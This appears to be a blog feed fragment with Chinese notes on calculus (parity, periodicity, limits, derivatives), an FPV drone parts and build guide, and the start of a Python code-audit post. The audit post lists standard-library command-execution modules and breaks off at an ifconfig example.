href="#奇偶性" class="headerlink" title="奇偶性"></a>奇偶性</h4><h5 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h5><p>设$f(x)$为一实变数实值函数，则${\displaystyle f}$为<strong>偶函数</strong>若下列的方程对所有在${\displaystyle f}$的定义域内的${\displaystyle x}$都成立</p><p>$\begin{align}<br>f(x) &amp; = f(-x)<br>\end{align}$</p><p>设${\displaystyle f(x)}$为一个实变数实值函数，则${\displaystyle f}$为<strong>奇函数</strong>若下列的方程对所有在$f$的定义域内的${\displaystyle x}$都成立</p><p>$\begin{align} f(x) &amp; = -f(-x) \end{align}$  </p><p>$\begin{align}f(-x) &amp; = -f(x)\end{align}$</p><p>总结：偶函数的图形关于$y$轴对称，奇函数的图形关于原点对称</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/9.png" alt="image-20221213140758006"></p><h5 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h5><p>$y=x^{2}$、$y=\cos x$ 都是偶函数</p><p>$y=x$ 、$y=x^{3}$ 、$y=\sin x$ 、$y=\tan x$ 、$y=\arctan x$都是奇函数</p><p>$y=e^{x}$  是非奇非偶的函数</p><h4 id="周期性"><a href="#周期性" class="headerlink" title="周期性"></a>周期性</h4><h5 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h5><p>对于实数或者整数函数来说，周期性意味着按照一定的间隔重复一个特定部分就可以绘制出完整的函数图。如果在函数${\displaystyle f}$中所有的位置${\displaystyle x}$都满足</p><p>$\begin{align}<br>f(x+T) &amp; = f(x)<br>\end{align}$</p><p>那么，${\displaystyle f}$就是周期为${\displaystyle T}$的周期函数。<strong>非周期函数</strong>就是没有类似周期${\displaystyle T}$的函数。</p><h5 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h5><p>常见的周期函数有${\displaystyle \sin x}$，${\displaystyle \cos x}$和${\displaystyle \tan x}$等</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/10.png" alt="img"></p><h2 id="极限的定义"><a href="#极限的定义" class="headerlink" title="极限的定义"></a>极限的定义</h2><h3 id="数列极限"><a href="#数列极限" class="headerlink" title="数列极限"></a>数列极限</h3><p>$\begin{align}\lim <em>{n \rightarrow \infty} x</em>{n}=A \end{align}$</p><p>$\forall \varepsilon&gt;0$, 存在正整数 $N$ , 当$n&gt;N$时, 就有$\left|x_{n}-A\right|&lt;\varepsilon$。</p><h3 id="函数极限"><a href="#函数极限" class="headerlink" title="函数极限"></a>函数极限</h3><p>$\begin{align}\lim <em>{x \rightarrow x</em>{0}} f(x)=A\end{align}$</p><p>$\forall \varepsilon&gt;0$, 存在正数$\delta$, 当$0&lt;\left|x-x_{0}\right|&lt;\delta$时, 就有$|f(x)-A|&lt;\varepsilon$。</p><h2 id="导数"><a href="#导数" class="headerlink" title="导数"></a>导数</h2><p>如果函数$y=f(x)$在开区间内每一点都可导，就称函数$y=f(x)$在区间内可导。这时函数$y=f(x)$对于区间内的每一个确定的$x$值，都对应着一个确定的导数值，这就构成一个新的函数，称这个函数为原来函数$y=f(x)$的导函数，记作$y^{\prime}$、$f^{\prime}(x)$、$\frac{\mathrm{d} y}{\mathrm{~d} x}$或$\frac{\mathrm{d} f(x)}{\mathrm{d} x}$，简称导数</p><p>$\begin{align}<br>f^{\prime}(x) &amp; = \lim _{\Delta x \rightarrow 0} \frac{f(x+\Delta x)-f(x)}{\Delta x}<br>\end{align}$</p><h3 id="求导法则"><a href="#求导法则" class="headerlink" title="求导法则"></a>求导法则</h3><h4 id="简单函数"><a href="#简单函数" class="headerlink" title="简单函数"></a>简单函数</h4><p>这里将列举14个基本初等函数的导数。</p><div class="table-container"><table><thead><tr><th><strong>函数</strong></th><th><strong>原函数</strong></th><th><strong>导函数</strong></th></tr></thead><tbody><tr><td>常函数</td><td>$y  = C$</td><td>$y^{\prime}  = 0$</td></tr><tr><td>指数函数</td><td>$y  = a^{x}$</td><td>$y^{\prime}  = a^{x} \ln a$</td></tr><tr><td>指数函数</td><td>$y  = e^{x}$</td><td>$y^{\prime}  = e^{x}$</td></tr><tr><td>幂函数</td><td>$y  = x^{n}$</td><td>$y^{\prime}  = n x^{n-1}$</td></tr><tr><td>对数函数</td><td>$y  = \log _{a} x$</td><td>$y^{\prime}  = \frac{1}{x \ln a}$</td></tr><tr><td>对数函数</td><td>$y  = \ln x$</td><td>$y^{\prime}  = \frac{1}{x}$</td></tr><tr><td>正弦函数</td><td>$y  = \sin x$</td><td>$y^{\prime}  = \cos x$</td></tr><tr><td>余弦函数</td><td>$y  = \cos x$</td><td>$y^{\prime}  = -\sin x$</td></tr><tr><td>正切函数</td><td>$y  = \tan x$</td><td>$y^{\prime}  = \sec ^{2} x$</td></tr><tr><td>余切函数</td><td>$y  = \cot x$</td><td>$y^{\prime}  = -\csc ^{2} x$</td></tr><tr><td>正割函数</td><td>$y  = \sec x$</td><td>$y^{\prime}  = \sec x \tan x$</td></tr><tr><td>余割函数</td><td>$y  = \csc x$</td><td>$y^{\prime}  = -\csc x \cot x$</td></tr><tr><td>反正弦函数</td><td>$y  = \arcsin x$</td><td>$y^{\prime}  = \frac{1}{\sqrt{1-x^{2}}}$</td></tr><tr><td>反余弦函数</td><td>$y  = \arccos x$</td><td>$y^{\prime}  = -\frac{1}{\sqrt{1-x^{2}}}$</td></tr><tr><td>反正切函数</td><td>$y  = \arctan x$</td><td>$y^{\prime}  = \frac{1}{1+x^{2}}$</td></tr><tr><td>反余切函数</td><td>$y  = \operatorname{arccot} x$</td><td>$y^{\prime}  = -\frac{1}{1+x^{2}}$</td></tr><tr><td>双曲线函数</td><td>$y  = \operatorname{sh} x$</td><td>$y^{\prime}  = \operatorname{ch} x$</td></tr></tbody></table></div><h4 id="函数的和、差、积、商的求导法则"><a href="#函数的和、差、积、商的求导法则" class="headerlink" title="函数的和、差、积、商的求导法则"></a>函数的和、差、积、商的求导法则</h4><p>和差</p><p>$\begin{align}(u \pm v)^{\prime}=u^{\prime} \pm v^{\prime}\end{align}$</p><p>积</p><p>$\begin{align}(u v)^{\prime}=u^{\prime} v+u v^{\prime} \end{align}$</p><p>商</p><p>$\begin{align}\left(\frac{u}{v}\right)^{\prime}=\frac{u^{\prime} v-u v^{\prime}}{v^{2}}<br>\end{align}$</p><h4 id="原函数与反函数导数关系"><a href="#原函数与反函数导数关系" class="headerlink" title="原函数与反函数导数关系"></a>原函数与反函数导数关系</h4><p>反函数的导数就是原函数导数的倒数</p><p>$\begin{align}<br>\left[f^{-1}(x)\right]^{\prime} &amp; = \frac{1}{f^{\prime}(y)} =\frac{\mathrm{d} y}{\mathrm{~d} x}=\frac{1}{\frac{\mathrm{d} x}{\mathrm{~d} y}}<br>\end{align}$</p><h4 id="复合函数"><a href="#复合函数" class="headerlink" title="复合函数"></a>复合函数</h4><p>如果$u=g(x)$在点$x$可导,而$y=f(u)$在点$u=g(x)$可导，那么复合函数$y=f[g(x)]$在点$x$可导,且其导数为</p><p>$\begin{align}\frac{\mathrm{d} y}{\mathrm{~d} x} &amp; = f^{\prime}(u) \cdot g^{\prime}(x)  = \frac{\mathrm{d} y}{\mathrm{~d} u} \cdot \frac{\mathrm{d} u}{\mathrm{~d} x} \end{align}$</p><h3 id="二阶导数"><a href="#二阶导数" class="headerlink" title="二阶导数"></a>二阶导数</h3><p>如果函数的导数${\displaystyle f’(x)}$在${\displaystyle x}$处可导，则称${\displaystyle (f’(x))’}$为${\displaystyle x}$的<strong>二阶导数</strong>。记做${\displaystyle f’’(x)}$，${\displaystyle y’’}$，${\displaystyle {\frac { { \text{d } }^{ 2 } y } { {\text{d} }x^{2} } } }$ 或${\displaystyle {\frac { {\text{d} }^{2}f(x)}{ {\text{d} }x^{2} } } }$。如果函数的二阶导数存在，我们就说这个函数在点${\displaystyle x}$处二阶可导。</p><h3 id="高阶导数"><a href="#高阶导数" class="headerlink" title="高阶导数"></a>高阶导数</h3><h4 id="定义-4"><a href="#定义-4" class="headerlink" title="定义"></a>定义</h4><p>在数学中，我们是通过${\displaystyle f(x)}$ 的${\displaystyle n-1}$阶导数（${\displaystyle n&gt;1}$ ）定义${\displaystyle n}$ 阶导数的。如果函数的${\displaystyle n-1}$ 阶导数在${\displaystyle x}$处可导，则称${\displaystyle f(x)}{\displaystyle n-1}$阶导数的导数为${\displaystyle f(x)}$ 的n阶导数。记做${\displaystyle f^{(n)}(x)}$，${\displaystyle {\frac { {\text{d} }^{n}y}{ {\text{d} }x^{n} } } }$ 或${\displaystyle {\frac { {\text{d} }^{n}f(x) } { {\text{d} }x^{n } } } }$。如果函数的$ {\displaystyle n}$ 阶导数存在，我们就说这个函数在点${\displaystyle x}$ 处${\displaystyle n}$ 阶可导。</p><h4 id="直接求导"><a href="#直接求导" class="headerlink" title="直接求导"></a>直接求导</h4><div class="table-container"><table><thead><tr><th>常用公式</th></tr></thead><tbody><tr><td>$\left(e^{\lambda x}\right)^{(n)} = \lambda^{n} e^{\lambda x}$</td></tr><tr><td>$(\sin w x)^{(n)}=w^{n} \sin \left(w x+n \cdot \frac{\pi}{2}\right)$</td></tr><tr><td>$(\cos w x)^{(n)}=w^{n} \cos \left(w x+n \cdot \frac{\pi}{2}\right)$</td></tr><tr><td>$[\ln (1+x)]^{(n)}=\frac{(-1)^{n-1}(n-1) !}{(1+x)^{n}} \quad(x&gt;-1)$</td></tr><tr><td>$\left(\frac{1}{x+1}\right)^{(n)}=\frac{(-1)^{n} n !}{(x+1)^{n+1}}$</td></tr><tr><td>$\left(\frac{1}{a x+b}\right)^{(n)}=\frac{(-1)^{n} n ! a^{n}}{(a x+b)^{n+1}} \quad(a \neq 0)$</td></tr><tr><td>$\left( a^x \right) ^{\left( n \right)}=a^x\ln ^na$</td></tr><tr><td>$\left( \log _ax \right) ^{\left( n \right)}=\frac{\left( -1 \right) ^{n-1}\left( n-1 \right) !}{x^n\ln a}$</td></tr></tbody></table></div><h4 id="间接法"><a href="#间接法" class="headerlink" title="间接法"></a>间接法</h4><div class="table-container"><table><thead><tr><th>运算法则</th></tr></thead><tbody><tr><td>$(u \pm v)^{(n)}=u^{(n)} \pm v^{(n)}$</td></tr><tr><td>$(C u)^{(n)}=C u^{(n)} \quad(C \in R)$</td></tr><tr><td>$(u v)^{(n)}=\sum<em>{k=0}^{n} \mathrm{C}</em>{n}^{k} u^{(n-k)} v^{(k)}$</td></tr></tbody></table></div><h3 id="隐函数"><a href="#隐函数" class="headerlink" title="隐函数"></a>隐函数</h3><p><strong>隐函数</strong>是由隐式方程所隐含定义的函数，比如${\displaystyle y={\sqrt {1-x^{2}}}}$是由${\displaystyle x^{2}+y^{2}-1=0}$确定的函数。而可以直接用含自变量的算式表示的函数称为显函数，也就是通常所说的函数，如${\displaystyle y=\cos(x)}$。</p><p>其中${\displaystyle y={\sqrt {1-x^{2}}}}$是<strong>显函数</strong>，${\displaystyle x^{2}+y^{2}-1=0}$是<strong>隐函数</strong></p><h3 id="隐函数求导"><a href="#隐函数求导" class="headerlink" title="隐函数求导"></a>隐函数求导</h3><p>步骤：</p><ul><li>把$y$变成$y(x)$</li><li>两边对$x$求导</li><li>解出$y^{\prime}$</li></ul><p>例子:</p><p>$\begin{align}<br>\mathrm{e}^{y}+x y-\mathrm{e} &amp; = 0 \longrightarrow<br>e^{y(x)}+x \cdot y(x)-e=0 \longrightarrow<br>e^{y} \cdot y^{\prime}+y+x \cdot y^{\prime}=0 \longrightarrow<br>y^{\prime}=-\frac{y}{x+e^{y}} \quad\left(x+e^{y} \neq 0\right)<br>\end{align}$</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>FPV笔记</title>
    <link href="https://www.ascotbe.com/2022/10/24/FPV/"/>
    <id>https://www.ascotbe.com/2022/10/24/FPV/</id>
    <published>2022-10-24T13:01:07.000Z</published>
    <updated>2023-01-05T06:17:01.848Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>随便几张图的，一些选配笔记</p><h2 id="穿越机的分类"><a href="#穿越机的分类" class="headerlink" title="穿越机的分类"></a>穿越机的分类</h2><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/10.png" alt="categories"></p><h3 id="按尺寸分类"><a href="#按尺寸分类" class="headerlink" title="按尺寸分类"></a>按尺寸分类</h3><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/11.png" alt="dimension"></p><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/1.png" alt="curriculum" style="zoom: 33%;" /></p><h2 id="构成图"><a href="#构成图" class="headerlink" title="构成图"></a>构成图</h2><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/2.png" alt=""></p><h2 id="飞塔"><a href="#飞塔" class="headerlink" title="飞塔"></a>飞塔</h2><p>飞塔是由飞控和电调这两个部分组成的。其核心设备是飞控，全称为飞行控制器，顾名思义，飞控属于飞机的控制系统，你可以把它理解为飞机的大脑，控制着飞机的动力系统（电机、电调、电池、螺旋桨）和图像传输系统（摄像头、图传、接收设备）的正常运作。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/3.png" alt="飞控"></p><p>电调的话有分四合一电调和分体电调。四合一电调的话是合在一个板块上的，方便焊接。而分体电调是有多个（主要看你又几个桨叶），一个电调控制一个桨叶</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/4.png" alt="电调"></p><h3 id="两层塔、三层塔有什么区别？"><a href="#两层塔、三层塔有什么区别？" class="headerlink" title="两层塔、三层塔有什么区别？"></a>两层塔、三层塔有什么区别？</h3><p>对于新手来说，直接选择飞塔可能会是一个比较省事儿的操作。因为一般来说，同一个厂牌的产品会有比较好的适配性和稳定性，装机的过程也会更加容易。由于机架的类型、空间的区别，飞塔通常会有两层塔和三层塔两种选择。</p><p>两层塔一般指的是飞控和电调的组合，适用于机架空间较大的花飞机架；三层塔一般指的是飞控+电调+图传的组合，适用于机架空间比较紧凑的竞速机架。</p><h3 id="选多大尺寸的飞控？"><a href="#选多大尺寸的飞控？" class="headerlink" title="选多大尺寸的飞控？"></a>选多大尺寸的飞控？</h3><p>选购飞控的第一步，是确定你要玩什么尺寸的飞机，选定机架之后仔细阅读商品详情页，以GEPRC/格普GEP-MK5举例采用了主流的30.5mm x30.5mm的飞控孔位</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/12.png" alt="image-20221110111142507"></p><h3 id="F4和F7有什么区别？"><a href="#F4和F7有什么区别？" class="headerlink" title="F4和F7有什么区别？"></a>F4和F7有什么区别？</h3><p>穿越机飞控常用的f4,f7芯片，是飞塔的主控芯片，主要用来进行一些数值运算，相当于电脑上的CPU</p><p>这两者最直观的区别就是性能和价格：f7有更强的性能，处理速度从f4的168Mhz上升到了216Mhz，是f4的1.5倍，当然价格也更高</p><h3 id="焊盘设计是否符合装机规律？"><a href="#焊盘设计是否符合装机规律？" class="headerlink" title="焊盘设计是否符合装机规律？"></a>焊盘设计是否符合装机规律？</h3><p>摄像头（CAM）的焊点在前，方便向前走线；接收机（REC）、图传（VTX）和LED灯的焊点在后，方便向后走线；左右两侧则是一些拓展焊点，如bb响、gps等，满足其他个性化的需求</p><h3 id="电调选多少A的合适？"><a href="#电调选多少A的合适？" class="headerlink" title="电调选多少A的合适？"></a>电调选多少A的合适？</h3><p>选择电调时，可以参阅电机的参数表，按照使用的电池电压和螺旋桨，选择相近的测试数据，查询相应的电流数据。</p><p>比如说我们现在装5寸的飞机，选用了TMOTOR黑鸟2207 V2.0的型号电机KV2800的话。如果使用T4943的三叶桨，我们的电调的话就得选用38.48A以上的电调。最好是高出1.5倍，不然会导致机器烧毁。淘宝上客服说35A的电调也可以用，那是你油门不拉倒百分百的情况下，只要你拉上百分百必定烧毁，奸商真恶心。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/13.png" alt="img"></p><p>推荐的厂家：格普、翼飞、飞盈佳乐、好盈</p><p>不推荐厂家：化骨龙</p><h2 id="电机"><a href="#电机" class="headerlink" title="电机"></a>电机</h2><h3 id="空心杯电机VS无刷电机"><a href="#空心杯电机VS无刷电机" class="headerlink" title="空心杯电机VS无刷电机"></a>空心杯电机VS无刷电机</h3><h4 id="空心杯电机"><a href="#空心杯电机" class="headerlink" title="空心杯电机"></a>空心杯电机</h4><p>空心杯电机属于直流电机，仅仅需要两根导线就能驱动，电机的电流越大则转速越快，<strong>无法精确控制速度</strong>，<strong>且只能朝一个方向旋转</strong>。控制空心杯电机只需要一个大电流的驱动芯片即可。</p><p>因为空心杯电机在旋转过程中需要持续倒置电极，所以转子（Rotor）和导线（Coil）之间通过电刷轻触连接。<strong>长时间的工作会对电刷造成磨损</strong>。</p><p>一台空心杯电机的无人机动力相对较弱，<strong>加速减速的能力较弱</strong>。而且各个电机不同程度的磨损容易导致速度不同步。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/14.gif" alt="brushed_motor"></p><h4 id="无刷电机"><a href="#无刷电机" class="headerlink" title="无刷电机"></a>无刷电机</h4><p>和空心杯电机不同，无刷电机的转子（Rotor）与定子（Stator）无接触，通常需要三根导线来驱动。无刷电靠电调的控制芯片产生生成轮替的电流，使定子上的导线依次产生磁力来牵引定子。所以<strong>无刷电机的机械损耗极低</strong>，<strong>且能双向旋转</strong>。</p><p>电调的存在能够让电机精确地控制速度。无刷电机除了有更高的绝对速度，也有<strong>更好的加速能力和减速能力</strong>，非常适合让穿越机在过弯时瞬间产生极高的电机速度差。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/15.gif" alt="brushless_motor"></p><h3 id="根据你的需求和机架，挑选适配的电机"><a href="#根据你的需求和机架，挑选适配的电机" class="headerlink" title="根据你的需求和机架，挑选适配的电机"></a>根据你的需求和机架，挑选适配的电机</h3><p>一般来说，现在市场上很多机架都会提供适配机架的电机型号，新手最好根据商家的推荐来选择相应的电机型号。</p><p>如果没有推荐的型号，就需要根据机架的电机座安装孔位来选择合适的电机，即——机臂和电机座的安装孔位必须一致，避免电机装不进机臂的情况出现。</p><p>举个栗子，你可能自行购买了商家标注3寸的机架和电机，到手却发现无法匹配，可能就是因为购买时忽略了机臂与电机座安装孔位的差异。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/16.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/17.png" alt="img"></p><p>然后我们看机架，支持16或者19的孔位</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/18.png" alt="image-20221110133053520"></p><h3 id="电机型号的数字是什么意思？怎么选？"><a href="#电机型号的数字是什么意思？怎么选？" class="headerlink" title="电机型号的数字是什么意思？怎么选？"></a>电机型号的数字是什么意思？怎么选？</h3><p>比较适合2-3寸机的1103/1106/1507等电机</p><p>比较适合5-7寸机的2206/2207/2306/2807等电机。</p><p>那么，这些数字是什么意思?</p><p>首先你需要知道电机有两个组成部分——定子和转子。</p><p>定子是缠绕铜丝的里面部分，转子是通过电磁炉旋转的轴承</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/19.png" alt="img" style="zoom:25%;" /></p><p>电机型号的前两位数字如11/22/23等系列的意思是电机定子的直径参数，而后两位数字如03/06/07等是定子高度的参数。定子的外径和高度越多，定子的铁芯越大，线圈绕的匝数也越多，表现出来就是电机的功率越大。当然，尺寸越大功率越大，但重量也越大。</p><h3 id="多大的kv值适合我？"><a href="#多大的kv值适合我？" class="headerlink" title="多大的kv值适合我？"></a>多大的kv值适合我？</h3><p>通常电机会有各种kv值让你选择，kv值的含义可以简单理解为——电压每增加1伏，电机的每分钟转速就增加多少。</p><p>如果有钱就买：黑鸟</p><p>没钱就买：dys</p><h2 id="机架"><a href="#机架" class="headerlink" title="机架"></a>机架</h2><p>机架的价格从几十到几百上千，不同的品牌、设计工艺和材质等因素，会造成机架价格的差异。一般来说，贵总是有贵的道理，但俗话说的好：<strong>有多少钱，就办多大事。</strong>毕竟机架不像眼镜和遥控，如果技术不到位，机架就是个消耗品。</p><p><strong>耐炸程度一般由两个方面决定。</strong></p><p>其一是机架的设计，包括几何设计和力学分析，需要一定的专业经验来判断，对普通消费者来说，关注一些圈内的技术大佬，然后看口碑即可。</p><p>其二是碳板的品质，最简单的方法就是看商家标示的碳纤维标号，如t300、t700，标号越高，碳板质量越好。</p><h2 id="桨叶"><a href="#桨叶" class="headerlink" title="桨叶"></a>桨叶</h2><h3 id="螺旋桨的参数是什么意思？"><a href="#螺旋桨的参数是什么意思？" class="headerlink" title="螺旋桨的参数是什么意思？"></a>螺旋桨的参数是什么意思？</h3><p>通常厂家会有两种标法，以51466-3和5.1X4.66X3为例。这两种标法的表达方式不同，但含义是相同的。前两位数字是螺旋桨的尺寸，如51就是5.1英寸；后面的数字表示的含义是螺距，简单来说，螺距就是螺旋桨旋转一圈前进的距离，如466即为4.66英寸的螺距；最后一位数字的含义是螺旋桨的叶数，如3就是3叶的螺旋桨。</p><h3 id="不同大小的螺距，有什么使用差异"><a href="#不同大小的螺距，有什么使用差异" class="headerlink" title="不同大小的螺距，有什么使用差异?"></a>不同大小的螺距，有什么使用差异?</h3><p>螺距大小影响拉力大小和手感，通常螺距越大，拉力也就越大。但螺距也不是越大越好的，大螺距的桨带给电机的负载也大，而小螺距的桨有响应更加快速、更加线性的优势。所以竞速飞机一般偏向于选择大螺距的桨，速度更快更暴力，而花飞通常喜欢使用较小螺距的桨，以获得更加顺滑的飞行和更快的动作响应</p><h3 id="好桨-好电机≠好动力，要看配合"><a href="#好桨-好电机≠好动力，要看配合" class="headerlink" title="好桨+好电机≠好动力，要看配合"></a>好桨+好电机≠好动力，要看配合</h3><p>大部分电机厂商会给出力效表，而看力效表的第一步就是找到相配的桨叶，不同的电机和螺旋桨的组合，产生的效果不同。</p><h3 id="桨叶方向"><a href="#桨叶方向" class="headerlink" title="桨叶方向"></a>桨叶方向</h3><p>一袋螺旋桨包括两正两反的4只螺旋桨，当你完成整机的安装，并且调参完毕后，就可以拿出你的螺旋桨进行起飞前的安装了。<strong>安装螺旋桨需要学会判断桨叶的朝向。</strong>如1、4号电机安装顺时针旋转的螺旋桨，桨叶的迎角向前（即上扬的一侧）；2、3号电机安装逆时针旋转的螺旋桨，桨叶的迎角向后</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/20.png" alt="img"></p><h2 id="遥控"><a href="#遥控" class="headerlink" title="遥控"></a>遥控</h2><ul><li><p>Futaba（t18sz/mz、t16sz/mz/iz、14sz/mz） </p></li><li><p>地平线（ix12、dx9、dx8）</p></li><li>黑羊TBS（Tango 2、Mambo）</li><li>福斯（i6、PL18）</li><li>乐迪（AT10、AT9S、AT9）</li><li>天地飞（et16、et12、et07）</li><li>Frsky（X9D）</li></ul><p>通道：指你可以通过遥控控制功能的多少（越多越好）充足的通道数有助于给控制飞机留有更多的余地，例如控制不同的功能，如解锁、切换模式等。</p><p>系统：分为闭源和开源。闭源系统一般是厂商适配自己遥控器的，比如天地飞、futaba、富斯等的操作系统。开源系统主要流行opentx及其衍生版本，如edgetx。一般推荐使用opentx及其衍生版本，因为在圈子里使用人数较高，容易得到技术支持；再者，opentx可以快速方便的获取更新，扩展性也非常强，后期升级遥控很方便；最后一点，opentx的内置功能非常丰富与强大，可以添加各种功能插件，如lua脚本，实现很多的功能。而这些功能如果放到闭源系统上，价格可能远高于opentx系统的遥控（举个例子，电压回传）。</p><p>高频头：遥控器可以加装高频头，高频头可以大大提升遥控的距离、减小延迟、增加稳定性等等。遥控器一般后部会有一个插槽，即JR仓，可以将内置的高频头卸下更换更加高级的外置高频头；</p><h3 id="两个摇杆如何控制无人机？"><a href="#两个摇杆如何控制无人机？" class="headerlink" title="两个摇杆如何控制无人机？"></a>两个摇杆如何控制无人机？</h3><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/21.gif" alt="yaw_pitch_roll"></p><p>穿越机的油门与姿态控制是非常重要的控制概念，其中<strong>throttle，pitch，yaw，roll在入坑后会频繁出现，需要着重记忆</strong>。</p><ul><li>左侧摇杆</li></ul><div class="table-container"><table><thead><tr><th>油门（Throttle）</th><th>偏航（Yaw）</th></tr></thead><tbody><tr><td><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/22.gif" alt="throttle"></td><td><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/25.gif" alt="yaw"></td></tr><tr><td>增大所有旋翼转速</td><td>左右转向</td></tr></tbody></table></div><ul><li>右侧摇杆</li></ul><div class="table-container"><table><thead><tr><th>俯仰（Pitch）</th><th>翻滚 （Roll）</th></tr></thead><tbody><tr><td><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/23.gif" alt="pitch"></td><td><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/24.gif" alt="roll"></td></tr><tr><td>前后摇摆</td><td>左右摇摆</td></tr></tbody></table></div><h2 id="电池"><a href="#电池" class="headerlink" title="电池"></a>电池</h2><p>1S-6S意思是电池片数，这个数字越高，则标称电压越高。室内机用的都是1S的电池，充电方便，体积重量也小。一个电芯电压只有3.7V，所以驱动能力比较差。</p><h2 id="装机"><a href="#装机" class="headerlink" title="装机"></a>装机</h2><p>将元件分类平摊在桌面上，细小的零件放在收纳盒中，导线和电子元件需要和尖锐物体分开放置。</p><h3 id="元件类"><a href="#元件类" class="headerlink" title="元件类"></a>元件类</h3><ul><li>必备：机架，电机，桨叶，飞塔（飞控与电调），摄像头，图传模组，图传发射天线，遥控信号接收机，接收天线</li></ul><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/5.png" alt="components"></p><ul><li>可选：LED灯带，GPS模块，蜂鸣器</li></ul><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/6.png" alt="components__optional"></p><h3 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h3><ul><li>焊接类：电烙铁，焊锡丝，万向夹，热风枪，万用表</li></ul><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/7.png" alt="soldering_tools"></p><ul><li>五金类：M2与M3六角螺丝刀，M3，M5内六角套筒，剥线钳，剪刀，镊子</li></ul><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/8.png" alt="tools"></p><h3 id="耗材类"><a href="#耗材类" class="headerlink" title="耗材类"></a>耗材类</h3><ul><li>硅胶导线，热缩管，M3内六角螺丝螺母，M5内六角螺母，M3通孔铝柱，绝缘胶带（推荐醋酸胶带），尼龙扎带</li></ul><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/9.png" alt="consumable"></p><h2 id="模拟器"><a href="#模拟器" class="headerlink" title="模拟器"></a>模拟器</h2><ul><li>TBS</li><li><p>FPV AIR2</p></li><li><p>Liftoff </p></li><li><p>Uncrashed</p></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="无人机" scheme="https://www.ascotbe.com/categories/%E6%97%A0%E4%BA%BA%E6%9C%BA/"/>
    
    <category term="配件介绍" scheme="https://www.ascotbe.com/categories/%E6%97%A0%E4%BA%BA%E6%9C%BA/%E9%85%8D%E4%BB%B6%E4%BB%8B%E7%BB%8D/"/>
    
    
    <category term="无人机" scheme="https://www.ascotbe.com/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA/"/>
    
    <category term="无人机配件" scheme="https://www.ascotbe.com/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA%E9%85%8D%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>代码审计笔记（Python）</title>
    <link href="https://www.ascotbe.com/2022/09/22/Python/"/>
    <id>https://www.ascotbe.com/2022/09/22/Python/</id>
    <published>2022-09-22T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.870Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p><del>收拾收拾下自己，发现好久没有学习了，上半年状态真的好差，之前学习也静不下心来</del></p><p>从比较简单的语言开始学习，看看能不能有啥好东西</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CodeAudit/Python/1.png" alt="1" style="zoom: 33%;" /></p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="标准库危险模块"><a href="#标准库危险模块" class="headerlink" title="标准库危险模块"></a>标准库危险模块</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 处理标记的都是通用的</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> commands  <span class="comment"># 仅限于python2</span></span><br><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接输入shell命令,以ifconfig举例</span></span><br><span class="line">os.system(<span 